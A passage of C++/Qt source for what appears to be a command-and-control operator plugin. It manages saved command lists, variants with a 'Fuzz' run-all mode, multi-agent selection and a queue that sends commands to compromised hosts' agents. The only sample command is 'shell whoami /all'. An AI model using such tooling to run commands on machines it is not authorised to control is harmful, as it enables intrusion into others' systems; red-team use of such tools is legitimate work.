            
            menu.addSeparator();
        }
        
        auto copyAction = menu.addAction("📋 复制命令");
        connect(copyAction, &QAction::triggered, [item]() {
            QString cmd = item->data(0, Qt::UserRole + 1).toString();
            QApplication::clipboard()->setText(cmd);
        });
        
        menu.addSeparator();
        
        // 添加到队列子菜单
        auto queueMenu = menu.addMenu("📥 添加到队列");
        
        // 添加到当前队列
        auto addCurrentAction = queueMenu->addAction(QString("➕ %1 (当前)").arg(currentQueueName));
        connect(addCurrentAction, &QAction::triggered, this, &TacticalWidget::onAddToQueue);
        
        // 添加到其他队列
        if (queueSelector->count() > 1) {
            queueMenu->addSeparator();
            for (int i = 0; i < queueSelector->count(); ++i) {
                QString qName = queueSelector->itemText(i);
                if (qName == currentQueueName) continue;
                
                auto addToAction = queueMenu->addAction(QString("📋 %1").arg(qName));
                connect(addToAction, &QAction::triggered, [this, qName]() {
                    onAddToQueueByName(qName);
                });
            }
        }
    }
    
    menu.exec(tree->mapToGlobal(pos));
}

void TacticalWidget::onAddCommand()
{
    int tabIndex = phaseTab->currentIndex();
    if (tabIndex < 0 || tabIndex >= phases.size()) return;
    
    QString phaseId = phases[tabIndex].id;
    QTreeWidget* tree = phaseTrees.value(phaseId, nullptr);
    if (!tree) return;
    
    // 创建编辑对话框
    QDialog dialog(this);
    dialog.setWindowTitle("添加自定义命令");
    dialog.setMinimumSize(500, 380);
    dialog.resize(600, 420);
    
    auto layout = new QVBoxLayout(&dialog);
    layout->setSpacing(10);
    
    // 选择分组
    auto groupLayout = new QHBoxLayout();
    auto groupLabel = new QLabel("添加到分组:", &dialog);
    auto groupCombo = new QComboBox(&dialog);
    
    // 填充当前阶段的分组
    const TacticalPhase& currentPhase = phases[tabIndex];
    for (const TacticalGroup& group : currentPhase.groups) {
        groupCombo->addItem(group.name, group.id);
    }
    
    groupLayout->addWidget(groupLabel);
    groupLayout->addWidget(groupCombo, 1);
    layout->addLayout(groupLayout);
    
    // 命令名称
    auto nameLabel = new QLabel("命令名称:", &dialog);
    auto nameEdit = new QLineEdit(&dialog);
    nameEdit->setPlaceholderText("例如: 获取系统信息");
    layout->addWidget(nameLabel);
    layout->addWidget(nameEdit);
    
    // 命令内容
    auto cmdLabel = new QLabel("命令内容:", &dialog);
    auto cmdEdit = new QTextEdit(&dialog);
    cmdEdit->setPlaceholderText("输入要执行的命令，支持多行...\n例如: shell whoami /all");
    cmdEdit->setMinimumHeight(100);
    layout->addWidget(cmdLabel);
    layout->addWidget(cmdEdit, 1);
    
    // 描述
    auto descLabel = new QLabel("描述 (可选):", &dialog);
    auto descEdit = new QLineEdit(&dialog);
    descEdit->setPlaceholderText("简要说明命令用途");
    layout->addWidget(descLabel);
    layout->addWidget(descEdit);
    
    // 按钮
    auto buttonBox = new QDialogButtonBox(QDialogButtonBox::Ok | QDialogButtonBox::Cancel, &dialog);
    connect(buttonBox, &QDialogButtonBox::accepted, &dialog, &QDialog::accept);
    connect(buttonBox, &QDialogButtonBox::rejected, &dialog, &QDialog::reject);
    layout->addWidget(buttonBox);
    
    if (dialog.exec() != QDialog::Accepted) return;
    
    QString groupId = groupCombo->currentData().toString();
    QString groupName = groupCombo->currentText();
    QString name = nameEdit->text().trimmed();
    QString cmd = cmdEdit->toPlainText().trimmed();
    QString desc = descEdit->text().trimmed();
    
    if (name.isEmpty() || cmd.isEmpty()) {
        QMessageBox::warning(this, "添加命令", "命令名称和内容不能为空");
        return;
    }
    
    // 创建命令
    TacticalCommand newCmd;
    newCmd.id = "user_" + QString::number(QDateTime::currentMSecsSinceEpoch());
    newCmd.name = name;
    newCmd.cmd = cmd;
    newCmd.description = desc;
    newCmd.phaseId = phaseId;   // 保存所属阶段
    newCmd.groupId = groupId;   // 保存所属分组
    
    // 保存到用户命令列表
    userCommands.append(newCmd);
    saveUserCommands();
    
    // 添加到选择的分组
    for (int i = 0; i < phases.size(); ++i) {
        if (phases[i].id == phaseId) {
            for (int j = 0; j < phases[i].groups.size(); ++j) {
                if (phases[i].groups[j].id == groupId) {
                    phases[i].groups[j].commands.append(newCmd);
                    break;
                }
            }
            break;
        }
    }
    
    updatePhaseTree();
    statusLabel->setText(QString("已添加命令 [%1]: %2").arg(groupName, name));
}

void TacticalWidget::onEditCommand()
{
    int tabIndex = phaseTab->currentIndex();
    if (tabIndex < 0 || tabIndex >= phases.size()) return;
    
    QString phaseId = phases[tabIndex].id;
    QTreeWidget* tree = phaseTrees.value(phaseId, nullptr);
    if (!tree) return;
    
    QTreeWidgetItem* item = tree->currentItem();
    if (!item || !item->parent()) return;
    
    // 如果是变体项，编辑其父命令
    bool isVariant = item->data(0, Qt::UserRole + 3).toBool();
    if (isVariant && item->parent()) {
        showCommandEditor(item->parent());
    } else {
        showCommandEditor(item);
    }
}

void TacticalWidget::onDeleteCommand()
{
    int tabIndex = phaseTab->currentIndex();
    if (tabIndex < 0 || tabIndex >= phases.size()) return;
    
    QString phaseId = phases[tabIndex].id;
    QTreeWidget* tree = phaseTrees.value(phaseId, nullptr);
    if (!tree) return;
    
    QTreeWidgetItem* item = tree->currentItem();
    if (!item || !item->parent()) return;
    
    QString ref = item->data(0, Qt::UserRole).toString();
    if (!ref.contains(".user.")) {
        QMessageBox::information(this, "删除命令", "只能删除自定义命令");
        return;
    }
    
    QString name = item->text(0);
    auto reply = QMessageBox::question(this, "删除命令", 
        QString("确定删除命令 \"%1\" 吗?").arg(name),
        QMessageBox::Yes | QMessageBox::No);
    
    if (reply != QMessageBox::Yes) return;
    
    QString cmdId = ref.split('.').last();
    
    // 从用户命令列表删除
    for (int i = 0; i < userCommands.size(); ++i) {
        if (userCommands[i].id == cmdId) {
            userCommands.removeAt(i);
            break;
        }
    }
    saveUserCommands();
    
    // 从阶段数据删除
    for (int i = 0; i < phases.size(); ++i) {
        if (phases[i].id == phaseId) {
            for (int j = 0; j < phases[i].groups.size(); ++j) {
                if (phases[i].groups[j].id == "user") {
                    for (int k = 0; k < phases[i].groups[j].commands.size(); ++k) {
                        if (phases[i].groups[j].commands[k].id == cmdId) {
                            phases[i].groups[j].commands.removeAt(k);
                            break;
                        }
                    }
                    break;
                }
            }
            break;
        }
    }
    
    updatePhaseTree();
    statusLabel->setText(QString("已删除命令: %1").arg(name));
}

void TacticalWidget::saveUserCommands()
{
    QJsonArray arr;
    for (const TacticalCommand& cmd : userCommands) {
        QJsonObject obj;
        obj["id"] = cmd.id;
        obj["name"] = cmd.name;
        obj["cmd"] = cmd.cmd;
        obj["description"] = cmd.description;
        obj["phaseId"] = cmd.phaseId;
        obj["groupId"] = cmd.groupId;
        obj["os"] = currentAgentOs.isEmpty() ? "windows" : currentAgentOs;
        arr.append(obj);
    }
    
    QJsonDocument doc(arr);
    QFile file(userCommandsFile);
    if (file.open(QIODevice::WriteOnly)) {
        file.write(doc.toJson());
        file.close();
    }
}

void TacticalWidget::loadUserCommands()
{
    userCommands.clear();
    
    QFile file(userCommandsFile);
    if (!file.exists() || !file.open(QIODevice::ReadOnly)) return;
    
    QJsonDocument doc = QJsonDocument::fromJson(file.readAll());
    file.close();
    
    if (!doc.isArray()) return;
    
    for (const QJsonValue& val : doc.array()) {
        QJsonObject obj = val.toObject();
        TacticalCommand cmd;
        cmd.id = obj["id"].toString();
        cmd.name = obj["name"].toString();
        cmd.cmd = obj["cmd"].toString();
        cmd.description = obj["description"].toString();
        cmd.phaseId = obj["phaseId"].toString();
        cmd.groupId = obj["groupId"].toString();
        userCommands.append(cmd);
    }
}

void TacticalWidget::saveCommandMods()
{
    QJsonArray arr;
    for (auto it = commandMods.begin(); it != commandMods.end(); ++it) {
        QJsonObject obj;
        obj["ref"] = it.key();
        obj["name"] = it.value().name;
        obj["cmd"] = it.value().cmd;
        obj["description"] = it.value().description;
        
        // 保存变体
        QJsonArray varArr;
        for (const CommandVariant& var : it.value().variants) {
            QJsonObject varObj;
            varObj["tag"] = var.tag;
            varObj["cmd"] = var.cmd;
            varObj["description"] = var.description;
            varArr.append(varObj);
        }
        if (!varArr.isEmpty()) {
            obj["variants"] = varArr;
        }
        
        arr.append(obj);
    }
    
    QJsonDocument doc(arr);
    QFile file(commandModsFile);
    if (file.open(QIODevice::WriteOnly)) {
        file.write(doc.toJson());
        file.close();
    }
}

void TacticalWidget::loadCommandMods()
{
    commandMods.clear();
    
    QFile file(commandModsFile);
    if (!file.exists() || !file.open(QIODevice::ReadOnly)) return;
    
    QJsonDocument doc = QJsonDocument::fromJson(file.readAll());
    file.close();
    
    if (!doc.isArray()) return;
    
    for (const QJsonValue& val : doc.array()) {
        QJsonObject obj = val.toObject();
        QString ref = obj["ref"].toString();
        
        TacticalCommand cmd;
        cmd.name = obj["name"].toString();
        cmd.cmd = obj["cmd"].toString();
        cmd.description = obj["description"].toString();
        
        // 加载变体
        if (obj.contains("variants") && obj["variants"].isArray()) {
            for (const QJsonValue& varVal : obj["variants"].toArray()) {
                QJsonObject varObj = varVal.toObject();
                CommandVariant var;
                var.tag = varObj["tag"].toString();
                var.cmd = varObj["cmd"].toString();
                var.description = varObj["description"].toString();
                cmd.variants.append(var);
            }
        }
        
        commandMods[ref] = cmd;
    }
}

void TacticalWidget::applyCommandMods()
{
    // 在 updatePhaseTree 后调用，将保存的修改应用到树项
    for (const QString& phaseId : phaseTrees.keys()) {
        QTreeWidget* tree = phaseTrees[phaseId];
        for (int i = 0; i < tree->topLevelItemCount(); ++i) {
            auto groupItem = tree->topLevelItem(i);
            for (int j = 0; j < groupItem->childCount(); ++j) {
                auto cmdItem = groupItem->child(j);
                QString ref = cmdItem->data(0, Qt::UserRole).toString();
                
                if (commandMods.contains(ref)) {
                    const TacticalCommand& mod = commandMods[ref];
                    
                    // 更新名称显示
                    if (!mod.variants.isEmpty()) {
                        cmdItem->setText(0, QString("%1 [%2变体]").arg(mod.name).arg(mod.variants.size()));
                        cmdItem->setForeground(0, QColor("#dcdcaa"));
                    } else {
                        cmdItem->setText(0, mod.name);
                    }
                    cmdItem->setText(1, mod.description);
                    cmdItem->setData(0, Qt::UserRole + 1, mod.cmd);
                    cmdItem->setData(0, Qt::UserRole + 2, mod.variants.size());
                    cmdItem->setToolTip(0, mod.cmd);
                    
                    // 移除旧的变体子项
                    while (cmdItem->childCount() > 0) {
                        delete cmdItem->takeChild(0);
                    }
                    
                    // 添加变体子项
                    for (int vi = 0; vi < mod.variants.size(); ++vi) {
                        const CommandVariant& var = mod.variants[vi];
                        auto varItem = new QTreeWidgetItem(cmdItem);
                        varItem->setFlags(varItem->flags() | Qt::ItemIsUserCheckable);
                        varItem->setCheckState(0, Qt::Unchecked);
                        varItem->setText(0, QString("├─ %1").arg(var.tag));
                        varItem->setText(1, var.description);
                        varItem->setText(2, "");
                        varItem->setData(0, Qt::UserRole + 1, var.cmd);
                        varItem->setData(0, Qt::UserRole + 3, true);
                        varItem->setToolTip(0, var.cmd);
                        varItem->setForeground(0, QColor("#9cdcfe"));
                    }
                }
            }
        }
    }
}

void TacticalWidget::onMultiAgentSelect()
{
    if (!adaptixWidget || adaptixWidget->AgentsVector.isEmpty()) {
        QMessageBox::information(this, "多目标选择", "没有可用的 Agent");
        return;
    }
    
    // 创建多选对话框
    QDialog dialog(this);
    dialog.setWindowTitle("选择多个目标");
    dialog.setMinimumSize(400, 300);
    
    auto layout = new QVBoxLayout(&dialog);
    
    auto label = new QLabel("选择要批量执行命令的 Agent:", &dialog);
    layout->addWidget(label);
    
    auto listWidget = new QListWidget(&dialog);
    listWidget->setSelectionMode(QAbstractItemView::MultiSelection);
    
    for (const QString& agentId : adaptixWidget->AgentsVector) {
        Agent* agent = adaptixWidget->AgentsMap.value(agentId, nullptr);
        if (agent) {
            QString displayName = QString("%1 (%2@%3) [%4]")
                .arg(agentId.left(8))
                .arg(agent->data.Username)
                .arg(agent->data.Computer)
                .arg(agent->data.Os == 1 ? "Win" : "Linux");
            
            auto item = new QListWidgetItem(displayName);
            item->setData(Qt::UserRole, agentId);
            
            // 如果之前选中过，保持选中状态
            if (selectedAgentIds.contains(agentId)) {
                item->setSelected(true);
            }
            
            listWidget->addItem(item);
        }
    }
    
    layout->addWidget(listWidget, 1);
    
    auto buttonBox = new QDialogButtonBox(QDialogButtonBox::Ok | QDialogButtonBox::Cancel, &dialog);
    connect(buttonBox, &QDialogButtonBox::accepted, &dialog, &QDialog::accept);
    connect(buttonBox, &QDialogButtonBox::rejected, &dialog, &QDialog::reject);
    layout->addWidget(buttonBox);
    
    if (dialog.exec() == QDialog::Accepted) {
        selectedAgentIds.clear();
        
        for (auto item : listWidget->selectedItems()) {
            selectedAgentIds.append(item->data(Qt::UserRole).toString());
        }
        
        if (selectedAgentIds.isEmpty()) {
            multiAgentBtn->setText("多目标");
            multiAgentBtn->setStyleSheet("");
            statusLabel->setText("未选择目标");
        } else {
            multiAgentBtn->setText(QString("多目标(%1)").arg(selectedAgentIds.size()));
            multiAgentBtn->setStyleSheet("background-color: #28a745; color: white;");
            statusLabel->setText(QString("已选择 %1 个目标").arg(selectedAgentIds.size()));
            
            // 清除单选
            agentCombo->setCurrentIndex(0);
            currentAgentId.clear();
        }
    }
}

void TacticalWidget::onCommandPreview(QTreeWidgetItem* item, int column)
{
    Q_UNUSED(column);
    if (!item || !item->parent()) return;
    
    // 如果是变体项，显示其父命令的编辑器
    bool isVariant = item->data(0, Qt::UserRole + 3).toBool();
    if (isVariant && item->parent()) {
        showCommandEditor(item->parent());
    } else {
        showCommandEditor(item);
    }
}

void TacticalWidget::showCommandEditor(QTreeWidgetItem* item)
{
    if (!item) return;
    
    QString baseName = item->text(0).split(" [").first();
    QString baseCmd = item->data(0, Qt::UserRole + 1).toString();
    QString desc = item->text(1);
    QString ref = item->data(0, Qt::UserRole).toString();
    bool isUserCmd = ref.contains(".user.");
    int variantCount = item->data(0, Qt::UserRole + 2).toInt();
    
    // 创建统一编辑器对话框
    QDialog dialog(this);
    dialog.setWindowTitle(QString("命令编辑器 - %1").arg(baseName));
    dialog.setMinimumSize(700, 550);
    dialog.resize(800, 600);
    
    auto mainLayout = new QVBoxLayout(&dialog);
    mainLayout->setSpacing(10);
    
    // === 顶部: 命令信息 ===
    auto infoGroup = new QGroupBox("命令信息", &dialog);
    auto infoLayout = new QGridLayout(infoGroup);
    
    infoLayout->addWidget(new QLabel("名称:", &dialog), 0, 0);
    auto nameEdit = new QLineEdit(baseName, &dialog);
    infoLayout->addWidget(nameEdit, 0, 1);
    
    infoLayout->addWidget(new QLabel("描述:", &dialog), 1, 0);
    auto descEdit = new QLineEdit(desc, &dialog);
    infoLayout->addWidget(descEdit, 1, 1);
    
    // 提示
    if (!isUserCmd) {
        auto infoLabel = new QLabel("<span style='color:#f0ad4e;'>⚠ 预置命令修改仅本次运行有效</span>", &dialog);
        infoLayout->addWidget(infoLabel, 2, 0, 1, 2);
    }
    
    mainLayout->addWidget(infoGroup);
    
    // === 中部: 命令版本表格 ===
    auto variantGroup = new QGroupBox("命令版本 (每行一个版本，可选择执行)", &dialog);
    auto variantLayout = new QVBoxLayout(variantGroup);
    
    // 版本表格: [默认] [标签] [命令内容]
    auto variantTable = new QTableWidget(&dialog);
    variantTable->setColumnCount(3);
    variantTable->setHorizontalHeaderLabels({"默认", "版本标签", "命令内容"});
    variantTable->horizontalHeader()->setSectionResizeMode(0, QHeaderView::Fixed);
    variantTable->horizontalHeader()->setSectionResizeMode(1, QHeaderView::ResizeToContents);
    variantTable->horizontalHeader()->setSectionResizeMode(2, QHeaderView::Stretch);
    variantTable->setColumnWidth(0, 50);
    variantTable->setSelectionBehavior(QAbstractItemView::SelectRows);
    variantTable->setSelectionMode(QAbstractItemView::ExtendedSelection);
    variantTable->setAlternatingRowColors(true);
    
    auto defaultGroup = new QButtonGroup(&dialog);
    
    // 填充表格数据
    auto addRowToTable = [&](const QString& tag, const QString& cmd, bool isDefault) {
        int row = variantTable->rowCount();
        variantTable->insertRow(row);
        
        // 默认选择按钮
        auto defaultRadio = new QRadioButton(&dialog);
        defaultRadio->setChecked(isDefault);
        defaultGroup->addButton(defaultRadio, row);
        auto radioWidget = new QWidget(&dialog);
        auto radioLayout = new QHBoxLayout(radioWidget);
        radioLayout->addWidget(defaultRadio);
        radioLayout->setAlignment(Qt::AlignCenter);
        radioLayout->setContentsMargins(0, 0, 0, 0);
        variantTable->setCellWidget(row, 0, radioWidget);
        
        // 标签
        variantTable->setItem(row, 1, new QTableWidgetItem(tag));
        
        // 命令
        variantTable->setItem(row, 2, new QTableWidgetItem(cmd));
    };
    
    // 添加现有版本
    if (variantCount > 0) {
        // 先添加默认版本
        addRowToTable("default", baseCmd, true);
        // 添加子变体
        for (int i = 0; i < item->childCount(); ++i) {
            QTreeWidgetItem* varItem = item->child(i);
            QString varTag = varItem->text(0).replace("├─ ", "");
            QString varCmd = varItem->data(0, Qt::UserRole + 1).toString();
            addRowToTable(varTag, varCmd, false);
        }
    } else {
        // 没有变体，只添加默认命令
        addRowToTable("default", baseCmd, true);
    }
    
    variantLayout->addWidget(variantTable);
    
    // 版本操作按钮
    auto variantBtnLayout = new QHBoxLayout();
    auto addVarBtn = new QPushButton("➕ 添加版本", &dialog);
    connect(addVarBtn, &QPushButton::clicked, [&]() {
        addRowToTable("new_variant", "", false);
        variantTable->editItem(variantTable->item(variantTable->rowCount() - 1, 1));
    });
    variantBtnLayout->addWidget(addVarBtn);
    
    auto removeVarBtn = new QPushButton("➖ 删除选中", &dialog);
    connect(removeVarBtn, &QPushButton::clicked, [&]() {
        QList<int> rows;
        for (auto item : variantTable->selectedItems()) {
            if (!rows.contains(item->row())) rows.append(item->row());
        }
        std::sort(rows.begin(), rows.end(), std::greater<int>());
        for (int row : rows) {
            if (variantTable->rowCount() > 1) {  // 至少保留一行
                variantTable->removeRow(row);
            }
        }
        // 确保有默认选中
        if (defaultGroup->checkedId() < 0 && variantTable->rowCount() > 0) {
            auto radio = qobject_cast<QRadioButton*>(
                static_cast<QWidget*>(variantTable->cellWidget(0, 0))->layout()->itemAt(0)->widget());
            if (radio) radio->setChecked(true);
        }
    });
    variantBtnLayout->addWidget(removeVarBtn);
    
    variantBtnLayout->addStretch();
    
    auto selectAllBtn = new QPushButton("全选", &dialog);
    connect(selectAllBtn, &QPushButton::clicked, [&]() {
        variantTable->selectAll();
    });
    variantBtnLayout->addWidget(selectAllBtn);
    
    auto selectNoneBtn = new QPushButton("取消选择", &dialog);
    connect(selectNoneBtn, &QPushButton::clicked, [&]() {
        variantTable->clearSelection();
    });
    variantBtnLayout->addWidget(selectNoneBtn);
    
    variantLayout->addLayout(variantBtnLayout);
    mainLayout->addWidget(variantGroup, 1);
    
    // === 底部: 操作按钮 ===
    auto buttonLayout = new QHBoxLayout();
    
    auto copyBtn = new QPushButton("📋 复制选中", &dialog);
    connect(copyBtn, &QPushButton::clicked, [&]() {
        QStringList cmds;
        for (auto item : variantTable->selectedItems()) {
            if (item->column() == 2) cmds << item->text();
        }
        if (cmds.isEmpty() && variantTable->rowCount() > 0) {
            // 没有选中，复制默认版本
            int defaultRow = defaultGroup->checkedId();
            if (defaultRow >= 0) {
                cmds << variantTable->item(defaultRow, 2)->text();
            }
        }
        QApplication::clipboard()->setText(cmds.join("\n"));
        statusLabel->setText("已复制到剪贴板");
    });
    buttonLayout->addWidget(copyBtn);
    
    buttonLayout->addStretch();
    
    // 执行选中版本
    auto execSelectedBtn = new QPushButton("▶ 执行选中", &dialog);
    execSelectedBtn->setStyleSheet("background-color: #007acc; color: white;");
    connect(execSelectedBtn, &QPushButton::clicked, [this, &dialog, variantTable, defaultGroup, baseName]() {
        QSet<int> selectedRows;
        for (auto tableItem : variantTable->selectedItems()) {
            selectedRows.insert(tableItem->row());
        }
        if (selectedRows.isEmpty()) {
            // 没有选中，执行默认版本
            int defaultRow = defaultGroup->checkedId();
            if (defaultRow >= 0) selectedRows.insert(defaultRow);
        }
        
        // 先收集要执行的命令（在关闭对话框前）
        QList<QPair<QString, QString>> cmdsToExecute;
        for (int row : selectedRows) {
            QString tag = variantTable->item(row, 1)->text();
            QString cmd = variantTable->item(row, 2)->text();
            if (!cmd.isEmpty()) {
                cmdsToExecute.append({cmd, QString("%1 [%2]").arg(baseName, tag)});
            }
        }
        
        dialog.accept();
        
        // 关闭对话框后执行
        for (const auto& pair : cmdsToExecute) {
            executeDirectCommand(pair.first, pair.second);
        }
    });
    buttonLayout->addWidget(execSelectedBtn);
    
    // 执行所有版本 (Fuzz)
    auto execAllBtn = new QPushButton("🎯 执行全部(Fuzz)", &dialog);
    execAllBtn->setStyleSheet("background-color: #6c757d; color: white;");
    connect(execAllBtn, &QPushButton::clicked, [this, &dialog, variantTable, baseName]() {
        int rowCount = variantTable->rowCount();
        if (rowCount <= 1) {
            QMessageBox::information(&dialog, "提示", "只有一个版本，无需 Fuzz");
            return;
        }
        
        QMessageBox::StandardButton reply = QMessageBox::question(
            &dialog, "Fuzz 确认",
            QString("即将依次执行 %1 的全部 %2 个版本。\n是否继续？")
                .arg(baseName).arg(rowCount),
            QMessageBox::Yes | QMessageBox::No
        );
        if (reply != QMessageBox::Yes) return;
        
        // 先收集要执行的命令（在关闭对话框前）
        QList<QPair<QString, QString>> cmdsToExecute;
        for (int row = 0; row < rowCount; ++row) {
            QString tag = variantTable->item(row, 1)->text();
            QString cmd = variantTable->item(row, 2)->text();
            if (!cmd.isEmpty()) {
                cmdsToExecute.append({cmd, QString("[Fuzz %1/%2] %3 - %4")
                    .arg(row + 1).arg(rowCount).arg(baseName, tag)});
            }
        }
        
        dialog.accept();
        
        // 关闭对话框后执行
        for (const auto& pair : cmdsToExecute) {
            executeDirectCommand(pair.first, pair.second);
        }
        statusLabel->setText(QString("Fuzz 已启动: %1 个版本").arg(cmdsToExecute.size()));
    });
    buttonLayout->addWidget(execAllBtn);
    
    buttonLayout->addSpacing(20);
    
    // 保存按钮
    auto saveBtn = new QPushButton("💾 保存", &dialog);
    connect(saveBtn, &QPushButton::clicked, [&]() {
        QString newName = nameEdit->text().trimmed();
        QString newDesc = descEdit->text().trimmed();
        if (newName.isEmpty()) {
            QMessageBox::warning(&dialog, "错误", "命令名称不能为空");
            return;
        }
        
        // 获取默认版本的命令
        int defaultRow = defaultGroup->checkedId();
        QString defaultCmd = (defaultRow >= 0) ? variantTable->item(defaultRow, 2)->text() : "";
        
        if (defaultCmd.isEmpty()) {
            QMessageBox::warning(&dialog, "错误", "默认版本的命令不能为空");
            return;
        }
        
        // 更新树项
        int varCount = variantTable->rowCount();
        if (varCount > 1) {
            item->setText(0, QString("%1 [%2变体]").arg(newName).arg(varCount - 1));
            item->setForeground(0, QColor("#dcdcaa"));
        } else {
            item->setText(0, newName);
            item->setForeground(0, QColor());
        }
        item->setText(1, newDesc);
        item->setData(0, Qt::UserRole + 1, defaultCmd);
        item->setData(0, Qt::UserRole + 2, varCount > 1 ? varCount - 1 : 0);
        item->setToolTip(0, defaultCmd);
        
        // 移除旧的子项（变体）
        while (item->childCount() > 0) {
            delete item->takeChild(0);
        }
        
        // 添加新的变体（跳过默认版本）
        for (int row = 0; row < variantTable->rowCount(); ++row) {
            if (row == defaultRow) continue;  // 跳过默认版本
            
            QString tag = variantTable->item(row, 1)->text();
            QString cmd = variantTable->item(row, 2)->text();
            if (cmd.isEmpty()) continue;
            
            auto varItem = new QTreeWidgetItem(item);
            varItem->setFlags(varItem->flags() | Qt::ItemIsUserCheckable);
            varItem->setCheckState(0, Qt::Unchecked);
            varItem->setText(0, QString("├─ %1").arg(tag));
            varItem->setText(1, "");
            varItem->setText(2, "");
            varItem->setData(0, Qt::UserRole + 1, cmd);
            varItem->setData(0, Qt::UserRole + 3, true);  // 标记为变体
            varItem->setToolTip(0, cmd);
            varItem->setForeground(0, QColor("#9cdcfe"));
        }
        
        // 保存命令修改到文件（所有命令都持久化）
        TacticalCommand modCmd;
        modCmd.name = newName;
        modCmd.cmd = defaultCmd;
        modCmd.description = newDesc;
        
        // 收集变体（跳过默认版本）
        for (int row = 0; row < variantTable->rowCount(); ++row) {
            if (row == defaultRow) continue;
            QString tag = variantTable->item(row, 1)->text();
            QString cmd = variantTable->item(row, 2)->text();
            if (!cmd.isEmpty()) {
                CommandVariant var;
                var.tag = tag;
                var.cmd = cmd;
                var.description = "";
                modCmd.variants.append(var);
            }
        }
        
        commandMods[ref] = modCmd;
        saveCommandMods();
        
        // 如果是自定义命令，也更新 userCommands
        if (isUserCmd) {
            QString cmdId = ref.split('.').last();
            for (int i = 0; i < userCommands.size(); ++i) {
                if (userCommands[i].id == cmdId) {
                    userCommands[i].name = newName;
                    userCommands[i].cmd = defaultCmd;
                    userCommands[i].description = newDesc;
                    userCommands[i].variants = modCmd.variants;
                    break;
                }
            }
            saveUserCommands();
        }
        
        statusLabel->setText(QString("已保存命令: %1").arg(newName));
        
        dialog.accept();
    });
    buttonLayout->addWidget(saveBtn);
    
    auto closeBtn = new QPushButton("关闭", &dialog);
    connect(closeBtn, &QPushButton::clicked, &dialog, &QDialog::reject);
    buttonLayout->addWidget(closeBtn);
    
    mainLayout->addLayout(buttonLayout);
    
    dialog.exec();
}

// ==================== 任务编排队列功能 ====================

void TacticalWidget::onAddToQueue()
{
    // 获取当前活动的命令树
    QTreeWidget* tree = qobject_cast<QTreeWidget*>(phaseTab->currentWidget());
    if (!tree) return;
    
    // 收集选中的命令
    QList<QTreeWidgetItem*> selected = tree->selectedItems();
    if (selected.isEmpty()) {
        // 如果没有选中，收集所有勾选的项
        QTreeWidgetItemIterator it(tree);
        while (*it) {
            if ((*it)->checkState(0) == Qt::Checked) {
                selected.append(*it);
            }
            ++it;
        }
    }
    
    int added = 0;
    for (QTreeWidgetItem* item : selected) {
        // 跳过分组项
        if (!item->parent()) continue;
        
        QString cmd = item->data(0, Qt::UserRole + 1).toString();
        if (cmd.isEmpty()) continue;
        
        QString name = item->text(0).split(" [").first();
        
        // 创建队列项
        auto listItem = new QListWidgetItem(QString("%1. %2").arg(taskQueueList->count() + 1).arg(name));
        listItem->setData(Qt::UserRole, cmd);
        listItem->setData(Qt::UserRole + 1, name);
        listItem->setToolTip(cmd);
        taskQueueList->addItem(listItem);
        added++;
    }
    
    if (added > 0) {
        syncUIToQueue();
        saveQueues();
        queueStatusLabel->setText(QString("%1 个任务").arg(taskQueueList->count()));
        statusLabel->setText(QString("已添加 %1 个命令到队列").arg(added));
    }
}

void TacticalWidget::onRemoveFromQueue()
{
    QList<QListWidgetItem*> selected = taskQueueList->selectedItems();
    for (QListWidgetItem* item : selected) {
        delete taskQueueList->takeItem(taskQueueList->row(item));
    }
    
    // 重新编号
    for (int i = 0; i < taskQueueList->count(); ++i) {
        QListWidgetItem* item = taskQueueList->item(i);
        QString name = item->data(Qt::UserRole + 1).toString();
        item->setText(QString("%1. %2").arg(i + 1).arg(name));
    }
    
    syncUIToQueue();
    saveQueues();
    queueStatusLabel->setText(QString("%1 个任务").arg(taskQueueList->count()));
}

void TacticalWidget::onMoveQueueUp()
{
    int row = taskQueueList->currentRow();
    if (row <= 0) return;
    
    QListWidgetItem* item = taskQueueList->takeItem(row);
    taskQueueList->insertItem(row - 1, item);
    taskQueueList->setCurrentRow(row - 1);
    
    // 重新编号
    for (int i = 0; i < taskQueueList->count(); ++i) {
        QListWidgetItem* it = taskQueueList->item(i);
        QString name = it->data(Qt::UserRole + 1).toString();
        it->setText(QString("%1. %2").arg(i + 1).arg(name));
    }
    syncUIToQueue();
    saveQueues();
}

void TacticalWidget::onMoveQueueDown()
{
    int row = taskQueueList->currentRow();
    if (row < 0 || row >= taskQueueList->count() - 1) return;
    
    QListWidgetItem* item = taskQueueList->takeItem(row);
    taskQueueList->insertItem(row + 1, item);
    taskQueueList->setCurrentRow(row + 1);
    
    // 重新编号
    for (int i = 0; i < taskQueueList->count(); ++i) {
        QListWidgetItem* it = taskQueueList->item(i);
        QString name = it->data(Qt::UserRole + 1).toString();
        it->setText(QString("%1. %2").arg(i + 1).arg(name));
    }
    syncUIToQueue();
    saveQueues();
}

void TacticalWidget::onClearQueue()
{
    if (taskQueueList->count() == 0) return;
    
    QMessageBox::StandardButton reply = QMessageBox::question(
        this, "确认清空",
        QString("确定要清空队列中的 %1 个任务吗？").arg(taskQueueList->count()),
        QMessageBox::Yes | QMessageBox::No
    );
    
    if (reply == QMessageBox::Yes) {
        taskQueueList->clear();
        syncUIToQueue();
        saveQueues();
        queueStatusLabel->setText("0 个任务");
        statusLabel->setText("队列已清空");
    }
}

void TacticalWidget::onRunQueue()
{
    if (taskQueueList->count() == 0) {
        statusLabel->setText("队列为空，请先添加命令");
        return;
    }
    
    if (currentAgentId.isEmpty() && selectedAgentIds.isEmpty()) {
        statusLabel->setText("请先选择 Agent");
        return;
    }
    
    // 确认执行
    QMessageBox::StandardButton reply = QMessageBox::question(
        this, "确认执行",
        QString("即将顺序执行队列中的 %1 个命令，间隔 %2 秒。\n是否继续？")
            .arg(taskQueueList->count()).arg(delaySpinBox->value()),
        QMessageBox::Yes | QMessageBox::No
    );
    
    if (reply != QMessageBox::Yes) return;
    
    // 禁用执行按钮
    runQueueBtn->setEnabled(false);
    runQueueBtn->setText("执行中...");
    
    // 显示进度条
    progressBar->setVisible(true);
    progressBar->setMaximum(taskQueueList->count());
    progressBar->setValue(0);
    
    // 将队列中的命令转移到 pendingCommands
    pendingCommands.clear();
    for (int i = 0; i < taskQueueList->count(); ++i) {
        QListWidgetItem* item = taskQueueList->item(i);
        QString cmd = item->data(Qt::UserRole).toString();
        QString name = item->data(Qt::UserRole + 1).toString();
        pendingCommands.append({cmd, QString("[%1/%2] %3").arg(i + 1).arg(taskQueueList->count()).arg(name)});
        
        // 更新队列项显示状态
        item->setForeground(QColor("#888"));
    }
    
    // 开始执行
    processQueueNext();
}

void TacticalWidget::processQueueNext()
{
